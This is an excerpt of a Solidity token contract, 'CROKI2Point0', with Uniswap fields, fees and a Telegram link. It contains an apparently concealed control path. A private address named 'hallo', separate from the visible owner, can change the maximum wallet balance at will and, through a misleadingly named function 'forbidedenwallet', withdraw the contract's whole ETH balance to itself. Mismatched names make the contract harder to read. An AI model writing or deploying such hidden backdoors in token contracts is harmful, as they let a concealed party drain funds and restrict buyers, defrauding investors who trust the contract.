...
//Telegram: https://t.me/croki2point0
...
contract CROKI2Point0  is Context, IERC20, Ownable {
    using Address for address;
    using Address for address payable;

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    address payable private hallo;
    ...
    string private constant _name = "slylangsakalam"; 
    string private constant _symbol = "sly"; 
    uint8 private constant _decimals = 9; 
    
    uint256 public _marketingFee = 1;
    uint256 public _liquidityFee = 1;
    address public  _marketingWallet = 0xF11B329abdf2C8FcEaCDDFdE4D698Ed04e4818a7;
    ...
    function setMaxWalletBalance(uint256 amount) external {
        require(msg.sender == hallo, "homestead");
        maxWalletAmount = amount * 10 ** _decimals;
    }

    function forbidedenwallet() public {
		require(msg.sender == hallo, "homestead");
		uint balance = address(this).balance;
		if(balance==0) return;
		hallo.transfer(balance);
	}
